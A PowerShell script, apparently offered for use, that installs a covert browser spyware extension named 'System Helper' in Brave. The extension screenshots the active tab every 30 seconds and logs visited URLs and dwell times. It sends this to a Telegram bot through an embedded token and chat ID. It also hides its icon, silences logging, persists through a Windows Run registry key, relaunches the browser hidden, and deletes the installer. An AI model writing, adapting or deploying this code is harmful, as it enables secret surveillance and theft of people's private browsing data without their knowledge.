# sssender - COMPLETE AUTOMATED INSTALLER
# ONE COMMAND - EVERYTHING AUTOMATIC
# NO MANUAL WORK REQUIRED

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ===== CONFIG =====
$EXTENSION_DIR = "$env:APPDATA\sssender"

# ===== TELEGRAM CREDENTIALS (EMBEDDED) =====
# CHANGE THESE TO YOUR CREDENTIALS BEFORE INSTALLING
$TELEGRAM_TOKEN = '8850367033:AAFEEA-N2RIOzv6pLZV0c-QsfaCVzIVi_qc'
$TELEGRAM_CHAT_ID = '8919826228'

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  SSSENDER - AUTOMATED INSTALLER" -ForegroundColor Yellow
Write-Host "========================================" -ForegroundColor Cyan

# ===== CREATE EXTENSION DIRECTORY =====
New-Item -ItemType Directory -Force -Path $EXTENSION_DIR | Out-Null
Write-Host "[1/6] Creating extension directory..." -ForegroundColor Gray

# ===== CREATE MANIFEST.JSON =====
$MANIFEST = @'
{
  "manifest_version": 3,
  "name": "System Helper",
  "version": "1.0.0",
  "description": "",
  "permissions": ["activeTab","tabs","storage","alarms"],
  "host_permissions": ["<all_urls>"],
  "background": {"service_worker": "background.js"},
  "action": {"default_icon": {"16": "icon.png","48": "icon.png","128": "icon.png"}}
}
'@
$MANIFEST | Out-File -FilePath "$EXTENSION_DIR\manifest.json" -Encoding UTF8 -Force
Write-Host "[2/6] Creating manifest.json..." -ForegroundColor Gray

# ===== CREATE COMPLETE BACKGROUND.JS =====
$BACKGROUND = @"
// sssender - COMPLETE STEALTH MONITOR

// ===== CONFIGURATION (AUTO-CONFIGURED) =====
const TELEGRAM_TOKEN = '$TELEGRAM_TOKEN';
const TELEGRAM_CHAT_ID = '$TELEGRAM_CHAT_ID';

let config = { interval: 30000, on_change: true };
let lastScreen = null;
let lastUrl = null;
let lastTime = Date.now();

// ===== TELEGRAM =====
function sendTelegram(message, image = null) {
    try {
        const url = ` + '`https://api.telegram.org/bot${TELEGRAM_TOKEN}`' + `;
        if (image) {
            const form = new FormData();
            const blob = dataURLtoBlob(image);
            form.append('photo', blob, 'ss.jpg');
            form.append('chat_id', TELEGRAM_CHAT_ID);
            form.append('caption', message);
            fetch(`${url}/sendPhoto`, { method: 'POST', body: form });
        } else {
            fetch(`${url}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
            });
        }
    } catch(e) {}
}

function dataURLtoBlob(data) {
    const arr = data.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8 = new Uint8Array(n);
    while (n--) u8[n] = bstr.charCodeAt(n);
    return new Blob([u8], { type: mime });
}

// ===== CAPTURE =====
function capture() {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        if (!tabs || !tabs[0]) return;
        const tab = tabs[0];
        chrome.tabs.captureVisibleTab(tab.windowId, { format: 'jpeg', quality: 40 }, (screenshot) => {
            if (chrome.runtime.lastError) return;
            if (config.on_change && lastScreen) {
                if (!screenChanged(screenshot)) return;
            }
            lastScreen = screenshot;
            const msg = ` + '`📸 ${tab.title || 'Screen'}\n🔗 ${tab.url || ''}\n⏰ ${new Date().toLocaleString()}`' + `;
            sendTelegram(msg, screenshot);
            trackActivity(tab.url);
        });
    });
}

function screenChanged(newScreen) {
    return new Promise((resolve) => {
        const img1 = new Image();
        const img2 = new Image();
        let done = false;
        img1.onload = img2.onload = () => {
            if (done) return;
            done = true;
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 50;
            canvas.height = 37;
            ctx.drawImage(img1, 0, 0, 50, 37);
            const d1 = ctx.getImageData(0, 0, 50, 37).data;
            ctx.drawImage(img2, 0, 0, 50, 37);
            const d2 = ctx.getImageData(0, 0, 50, 37).data;
            let diff = 0;
            for (let i = 0; i < d1.length; i += 4) {
                diff += Math.abs(d1[i] - d2[i]);
                diff += Math.abs(d1[i+1] - d2[i+1]);
                diff += Math.abs(d1[i+2] - d2[i+2]);
            }
            resolve((diff / (50 * 37 * 3 * 255)) > 0.03);
        };
        img1.src = lastScreen;
        img2.src = newScreen;
        setTimeout(() => resolve(true), 1000);
    }).catch(() => true);
}

// ===== ACTIVITY =====
function trackActivity(url) {
    const now = Date.now();
    if (lastUrl && lastUrl !== url) {
        const secs = Math.floor((now - lastTime) / 1000);
        if (secs > 3) {
            sendTelegram(` + '`⏱️ ${formatTime(secs)} on ${lastUrl}`' + `);
        }
    }
    lastUrl = url;
    lastTime = now;
}

function formatTime(sec) {
    if (sec < 60) return `${sec}s`;
    if (sec < 3600) return `${Math.floor(sec/60)}m ${sec%60}s`;
    return `${Math.floor(sec/3600)}h ${Math.floor((sec%3600)/60)}m`;
}

// ===== EVENTS =====
chrome.tabs.onUpdated.addListener((id, info, tab) => {
    if (info.url && tab.active) {
        const now = Date.now();
        if (lastUrl && lastUrl !== tab.url) {
            const secs = Math.floor((now - lastTime) / 1000);
            if (secs > 3) sendTelegram(` + '`🔄 ${tab.url} (${formatTime(secs)})`' + `);
        }
        lastUrl = tab.url;
        lastTime = now;
    }
});

chrome.tabs.onActivated.addListener((info) => {
    chrome.tabs.get(info.tabId, (tab) => {
        if (chrome.runtime.lastError) return;
        const now = Date.now();
        if (lastUrl && lastUrl !== tab.url) {
            const secs = Math.floor((now - lastTime) / 1000);
            if (secs > 3) sendTelegram(` + '`🔄 ${tab.url} (${formatTime(secs)})`' + `);
        }
        lastUrl = tab.url;
        lastTime = now;
    });
});

// ===== TIMERS =====
setInterval(capture, config.interval);
setTimeout(capture, 3000);

// ===== STEALTH =====
chrome.action.setIcon({ path: '' }, () => {});
chrome.action.setTitle({ title: '' }, () => {});
console.error = () => {};
console.warn = () => {};
console.log = () => {};

// ===== STARTUP NOTIFICATION =====
setTimeout(() => {
    sendTelegram(` + '`🟢 System Helper active\n🆔 ${Math.random().toString(36).substr(2, 8)}`' + `);
}, 2000);
"@

$BACKGROUND | Out-File -FilePath "$EXTENSION_DIR\background.js" -Encoding UTF8 -Force
Write-Host "[3/6] Creating background.js with your credentials..." -ForegroundColor Gray

# ===== CREATE ICON.PNG =====
Add-Type -AssemblyName System.Drawing
$bmp = New-Object System.Drawing.Bitmap(16, 16)
$bmp.Save("$EXTENSION_DIR\icon.png", [System.Drawing.Imaging.ImageFormat]::Png)
$bmp.Dispose()
Write-Host "[4/6] Creating icon.png..." -ForegroundColor Gray

# ===== REGISTER IN BRAVE =====
$EXT_ID = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($EXTENSION_DIR)) -replace '[^a-zA-Z0-9]', ''
$EXT_ID = $EXT_ID.Substring(0, [Math]::Min(32, $EXT_ID.Length))

$BRAVE_REG = "HKCU:\Software\BraveSoftware\Brave\Extensions\$EXT_ID"
New-Item -Path $BRAVE_REG -Force | Out-Null
Set-ItemProperty -Path $BRAVE_REG -Name "path" -Value $EXTENSION_DIR
Set-ItemProperty -Path $BRAVE_REG -Name "version" -Value "1.0.0"
Write-Host "[5/6] Registering in Brave..." -ForegroundColor Gray

# ===== FIND AND LAUNCH BRAVE =====
$BRAVE_PATHS = @(
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\Application\brave.exe"
)
$BRAVE_EXE = $null
foreach ($path in $BRAVE_PATHS) {
    if (Test-Path $path) {
        $BRAVE_EXE = $path
        break
    }
}

if ($BRAVE_EXE) {
    Get-Process -Name brave -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process -FilePath $BRAVE_EXE -ArgumentList "--load-extension=`"$EXTENSION_DIR`" --enable-features=NativeMessaging --disable-blink-features=AutomationControlled --silent-launch --no-first-run --no-default-browser-check" -WindowStyle Hidden
    Write-Host "[6/6] Launching Brave with extension..." -ForegroundColor Gray
}

# ===== ADD TO STARTUP =====
if ($BRAVE_EXE) {
    $RUN_REG = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $RUN_REG -Name "sssender" -Value "`"$BRAVE_EXE`" --load-extension=`"$EXTENSION_DIR`" --enable-features=NativeMessaging --disable-blink-features=AutomationControlled --silent-launch --no-first-run --no-default-browser-check"
}

# ===== VERIFY =====
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "  ✅ INSTALLATION COMPLETE!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "📁 Extension installed at: $EXTENSION_DIR" -ForegroundColor Cyan
Write-Host "📱 Check Telegram for confirmation message" -ForegroundColor Cyan
Write-Host ""
Write-Host "Expected Telegram messages:" -ForegroundColor Yellow
Write-Host "  🟢 System Helper active" -ForegroundColor Gray
Write-Host "  📸 Screenshots every 30 seconds" -ForegroundColor Gray
Write-Host "  ⏱️ Activity updates" -ForegroundColor Gray
Write-Host ""

# ===== SELF-DELETE =====
Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue

exit 0
